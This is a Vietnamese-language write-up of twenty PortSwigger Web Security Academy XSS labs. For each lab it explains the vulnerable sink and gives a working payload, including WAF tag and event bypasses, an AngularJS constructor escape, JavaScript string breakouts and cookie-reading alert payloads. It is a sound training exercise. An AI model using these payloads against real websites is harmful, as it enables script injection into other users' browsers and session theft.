# Lab 1: Reflected XSS into HTML context with nothing encoded
![image](https://hackmd.io/_uploads/By9bZC9BT.png)

Đơn giản là chèn script vào ô tìm kiếm
```js
<script>alert("hi")</script>
```
![image](https://hackmd.io/_uploads/HyL_bRqST.png)

# Lab 2: Stored XSS into HTML context with nothing encoded
![image](https://hackmd.io/_uploads/Hy_emR5S6.png)

Vẫn là script như trên nhưng lỗi XSS gặp ở phần comment
![image](https://hackmd.io/_uploads/ByrPmRcHT.png)

# Lab 3: DOM XSS in document.write sink using source location.search
![image](https://hackmd.io/_uploads/Syqr_X2Ba.png)

Ở source code thì ta có script, script này  thực hiện tìm kiếm thông qua hàm `trackSearch` để ghi nội dung vào DOM
![image](https://hackmd.io/_uploads/rJxgbnAB6.png)

Lúc này script trở thành
```js
document.write('<img src="/resources/images/tracker.gif?searchTerms=1">')
```
![image](https://hackmd.io/_uploads/ryRwW3Ar6.png)

Ta sẽ payload `query` như sau
```
"><script>alert(1)</script>"
```
Script trở thành
```js
document.write('<img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>"">')
```
![image](https://hackmd.io/_uploads/ByzWX3RSa.png)

# Lab 4: DOM XSS in document.write sink using source location.search inside a select element
![image](https://hackmd.io/_uploads/HkXZBnCrp.png)

Xem source thì ta biết param `storeId` sẽ được tìm kiếm trên url là ghi vào DOM, nếu tìm thấy thì tức là storeId này đang được chọn và cũng ghi vào DOM
![image](https://hackmd.io/_uploads/r1Mld3CHp.png)

Tuy nhiên không có argument nào được validate, vậy ta chèn 
![image](https://hackmd.io/_uploads/HJMXq3CBT.png)
![image](https://hackmd.io/_uploads/rJfoihRra.png)

# Lab 5: DOM XSS in innerHTML sink using source location.search
![image](https://hackmd.io/_uploads/Skao460Sp.png)

Lab này đã sử dụng `innerHTML`, tức là không cho phép sử dụng `script` hay `svg onload`
![image](https://hackmd.io/_uploads/HJSXBaCH6.png)
![image](https://hackmd.io/_uploads/S1swBaASp.png)

Tuy nhiên dùng `img` hoặc `iframe` cùng các event như `onload` và `onerror` vẫn được chấp nhận.
```js
<img src=1 onerror=alert(document.domain)>
```
![image](https://hackmd.io/_uploads/r1vZIaAHT.png)

# Lab 6: DOM XSS in jQuery anchor href attribute sink using location.search source
![image](https://hackmd.io/_uploads/ByZJrP18a.png)

Đoạn script có chức năng sử dụng hàm `attr()` thay đổi thuộc tính `href` của thẻ a id `backLink`, bằng cách sử dụng dữ liệu từ URL được truyền qua param `returnPath`.
![image](https://hackmd.io/_uploads/r1gVCqw1Ia.png)
![image](https://hackmd.io/_uploads/HkRbowJIp.png)

Ta sẽ payload như sau
```
?returnPath=javascript:alert(document.cookie)
```
![image](https://hackmd.io/_uploads/HJW3jw1Up.png)

# Lab 7: DOM XSS in jQuery selector sink using a hashchange event
![image](https://hackmd.io/_uploads/HJsxJ_186.png)

Script dùng để bắt sự kiện `hashchange` trên cửa sổ và sau đó cuộn trang để hiển thị phần tử có url chứa giá trị hash tương ứng.
![image](https://hackmd.io/_uploads/BJBZl_yUT.png)

Payload
```
#<img src=1 onerror=alert(1)>
```
![image](https://hackmd.io/_uploads/By1qq_yUa.png)
Vậy là ta có thể thêm bất kỳ error nào nếu muốn

Tuy nhiên, ta cần kích hoạt sự kiện `hashchange` mà không cần sự tương tác của người dùng bằng cách dùng `iframe`
```
<iframe src="https://0a0e00b604d1e7df82d66a5100530084.web-security-academy.net//#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```
![image](https://hackmd.io/_uploads/BJPk6uJUT.png)
![image](https://hackmd.io/_uploads/H1Ee6_1Up.png)

# Lab 8: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
![image](https://hackmd.io/_uploads/S1R1ZwgUa.png)

Ta thấy web sử dụng thuộc tính `ng-app` trong thẻ html, chứng tỏ nó sử dụng framework AngularJS
![image](https://hackmd.io/_uploads/H1-JbweUa.png)
Ngoài ra, xem source ta cũng biết web sử dụng Angular 1.7.7
![image](https://hackmd.io/_uploads/HJbvzveU6.png)

AngularJS sẽ thực thi JavaScript bên trong dấu ngoặc nhọn đôi có thể xuất hiện trực tiếp trong HTML hoặc bên trong các thuộc tính. Chèn thử `hihi{{1+1}}`
![image](https://hackmd.io/_uploads/S1b6WDlI6.png)
Vậy nó thực thi được lệnh trong dấu ngoặc nhọn `{{}}`

Chèn tiếp 
```
{{constructor.constructor('alert(1)')()}}
```
![image](https://hackmd.io/_uploads/Hk9kXDxIT.png)

# Lab 9: Reflected DOM XSS
![image](https://hackmd.io/_uploads/S1saBvxUp.png)

Khi search thì kết quả được trả về thông qua hàm `search` đối số `search-results`
![image](https://hackmd.io/_uploads/r1zTdweUa.png)

Đọc file `searchResults.js` ta biết hàm này sau khi thực thi nhận được phản hồi status 200 sẽ sử dụng `eval()` để phân tích cú pháp của `responseText` thành một đối tượng JavaScript (searchResultsObj), sau đó gọi hàm displaySearchResults để hiển thị.
![image](https://hackmd.io/_uploads/BydqKvx8a.png)

Quan sát JSON trả về có dạng 
```json
{"results":[],"searchTerm":"abcd"}
```
![image](https://hackmd.io/_uploads/Hk70aPxI6.png)

Payload 
```json
abcd"} + alert(1); //
```
tức là
```json
{"results":[],"searchTerm":"abcd"} + alert(1); //"}
```
JSON được chèn thêm ký tự `\`, trong JS thì được hiểu đây là ký tự thoát, những lệnh sau `"` đều không được thực thi
![image](https://hackmd.io/_uploads/BJxVy_lLa.png)

Chỉ cần double dấu `\` là xong
```
abcd\"} + alert(1); //
```
![image](https://hackmd.io/_uploads/SkmVgOeIT.png)

# Lab 10: Stored DOM XSS
![image](https://hackmd.io/_uploads/BJ4D1sg8a.png)

Chèn thử `<script>alert(1)</script>` nhưng web chỉ hiện một phần của payload
![image](https://hackmd.io/_uploads/H1rGRjgIp.png)

Kiểm tra source thì thấy comment được xử lý thông qua code js trước khi load lên server
![image](https://hackmd.io/_uploads/B1HdIjgLp.png)

Web sử dụng replace() để mã hóa ký tự `<` và `>`
![image](https://hackmd.io/_uploads/HyL6Psx8a.png)

Tuy nhiên theo [doc](https://www.w3schools.com/jsref/jsref_replace.asp) thì replace chỉ thay thế ký tự xuất hiện đầu tiên
![image](https://hackmd.io/_uploads/Sk52AjeUp.png)
Vậy nên `</script>` đã biến mất

Payload
```
<><img src=1 onerror=alert(1)>
```
![image](https://hackmd.io/_uploads/HyF9gheLa.png)

# Lab 11: Reflected XSS into HTML context with most tags and attributes blocked
![image](https://hackmd.io/_uploads/rkPar2gLa.png)

Vẫn là chèn 1 script quen thuộc
![image](https://hackmd.io/_uploads/ByOBvyMIT.png)

Tuy nhiên script đã bị tường lửa chặn (WAF)
![image](https://hackmd.io/_uploads/BykPvkGUp.png)

Để bypass WAF, ta sẽ brute-force xem những tag và event nào không bị chặn
![image](https://hackmd.io/_uploads/Sko_F1GI6.png)

Ta có list các tag ở [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) này
![image](https://hackmd.io/_uploads/HJg5YJfI6.png)
![image](https://hackmd.io/_uploads/rkRycyGLT.png)
Thẻ `body` và `custom tags` không bị filter

Tương tự với các event
![image](https://hackmd.io/_uploads/BkTjqJzLa.png)
![image](https://hackmd.io/_uploads/BkRn5JzL6.png)
![image](https://hackmd.io/_uploads/SygSoyG8a.png)

Tìm kiếm payload trong cheat sheet 
![image](https://hackmd.io/_uploads/B16Jxlf8a.png)

Giờ thì không bị chặn nữa
![image](https://hackmd.io/_uploads/B1ngxxzIp.png)

Payload
```
<iframe src="https://0ab900160404a52d8043260200500028.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
![image](https://hackmd.io/_uploads/rkIS0kMIT.png)

![image](https://hackmd.io/_uploads/S1kaaJz8T.png)

# Lab 12: Reflected XSS into HTML context with all tags blocked except custom ones
![image](https://hackmd.io/_uploads/SkqgZgGIp.png)

Lab này cũng bị chặn giống lab trước ngoài trừ custom tags
![image](https://hackmd.io/_uploads/SJ8eblMUp.png)

Ta tìm payload ở [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) này
![image](https://hackmd.io/_uploads/HJD9QlzLT.png)
![image](https://hackmd.io/_uploads/ByPy4gfI6.png)

Payload
```js
<script>
location = 'https://0ad4006d04fa6ebe801a26de000b000d.web-security-academy.net/?search=%3Cxss+autofocus+tabindex=1+onfocus%3Dalert%28document.cookie%29%3E%3C/xss%3E';
</script>
```
![image](https://hackmd.io/_uploads/B18jLezLa.png)
![image](https://hackmd.io/_uploads/rk128xzLT.png)

# Lab 13: Reflected XSS with event handlers and href attributes blocked
![image](https://hackmd.io/_uploads/HJ0DwxG86.png)

Lab này cũng filter tag
![image](https://hackmd.io/_uploads/SyZGZbGUT.png)

Fuzz được các tag không bị block
![image](https://hackmd.io/_uploads/H1jvObMLp.png)

Tuy nhiên `href` của thẻ `a` thì bị block
![image](https://hackmd.io/_uploads/BkV_zWMLp.png)

Xây dựng payload như sau:

Sử dụng `animate` để thay đổi giá trị của thuộc tính `href`, khi click vào liên kết thì nó sẽ gọi đến hàm `alert()`
```
<animate attributeName=href values=javascript:alert(1) />
```  
Tạo 1 vùng văn bản lừa nạn nhân click vào
```
<text x=20 y=20>Click me</text>
```

Payload cuối cùng
```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
![image](https://hackmd.io/_uploads/HyOcYZMUT.png)

# Lab 14: Reflected XSS with some SVG markup allowed
![image](https://hackmd.io/_uploads/HyaIwxGUp.png)

Lab này cũng filter tag
![image](https://hackmd.io/_uploads/SkJajgMIa.png)

Brute-force tag hoạt động được, sử dụng [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 
![image](https://hackmd.io/_uploads/H1iu3lMUp.png)
![image](https://hackmd.io/_uploads/HkqtTxfLa.png)
Tìm được tag`<animatetransform>`, `<image>`, `<svg>`, `<title>` không bị filter

Ở đây ta sẽ sử dụng `svg`. Tìm kiếm payload trên cheat sheet
![image](https://hackmd.io/_uploads/H1EaAeML6.png)

Payload với event `onbegin` thì đã giải được lab
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
![image](https://hackmd.io/_uploads/HJ6BJbfIa.png)



# Lab 15: Reflected XSS into attribute with angle brackets HTML-encoded
![image](https://hackmd.io/_uploads/SJRyQP-Lp.png)

Chèn thử `<script>alert(1)</script>` thì không thu được gì
Xem lại source thì thấy `<` và `>` đã bị mã hóa
![image](https://hackmd.io/_uploads/HJmYldWIT.png)

Payload
```
" autofocus onfocus=alert(1) x="
```
![image](https://hackmd.io/_uploads/BJl8Z_W8T.png)
![image](https://hackmd.io/_uploads/S1tvlOb8a.png)

# Lab 16: Stored XSS into anchor href attribute with double quotes HTML-encoded
![image](https://hackmd.io/_uploads/BJs7fOWUp.png)

Kiểm tra chức năng bình luận thấy thuộc tính href của thẻ a chứa đường dẫn đến website mà ta đã nhập
![image](https://hackmd.io/_uploads/H1HxIOWIa.png)

Dùng javascript pseudo-protocol để thực thi script. Payload:
```
javascript:alert(1)
```
![image](https://hackmd.io/_uploads/SkVVwOb8a.png)

# Lab 17: Reflected XSS in canonical link tag
![image](https://hackmd.io/_uploads/S1jeOuWU6.png)

Xem source thấy web sử dụng thẻ `link` với `canonical` link tag
![image](https://hackmd.io/_uploads/SygI-iZLT.png)

Thử inject thuộc tính `accesskey` với sự kiện `onclick`, `accesskey` cho phép xác định 1 chữ cái khi được nhấn kết hợp với các phím khác sẽ khiến sự kiện xảy ra. 
Payload:
```
/?'accesskey='x'onclick='alert(1)
```
![image](https://hackmd.io/_uploads/rkv57o-L6.png)

# Lab 18: Reflected XSS into a JavaScript string with single quote and backslash escaped
![image](https://hackmd.io/_uploads/Syze6bMUT.png)

Chèn script quen thuộc
![image](https://hackmd.io/_uploads/rkxZAZfI6.png)
Kết quả trả về hơi lạ

Xem source thì ta biết vì trước hết trình duyệt phân tích cú pháp HTML để xác định các thành phần trang, sau đó mới thực hiện các lệnh
![image](https://hackmd.io/_uploads/rJF4RbfLT.png)

Payload
```
</script><img src=1 onerror=alert(1)>
```
![image](https://hackmd.io/_uploads/Hkxrgzf8T.png)

# Lab 19: Reflected XSS into a JavaScript string with angle brackets HTML encoded
![image](https://hackmd.io/_uploads/SyfoQzz86.png)

Ở lab này dấu `<` và `>` đã bị mã hóa
![image](https://hackmd.io/_uploads/r1AVNGMIT.png)

Để thoát khỏi chuỗi này và gọi hàm `alert()`. Payload lại như sau
```
';alert(1);//
```
![image](https://hackmd.io/_uploads/BJG-8MGI6.png)

# Lab 20: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
![image](https://hackmd.io/_uploads/ryttLMMLa.png)

Lab này đã mã hóa ký tự `<>`, `""` và bỏ qua ký tự `''`
![image](https://hackmd.io/_uploads/SJpVDMfUa.png)
![image](https://hackmd.io/_uploads/SJnHDMf8p.png)

Payload
```
\';alert(1)//
```
![image](https://hackmd.io/_uploads/ryH6DfzUT.png)
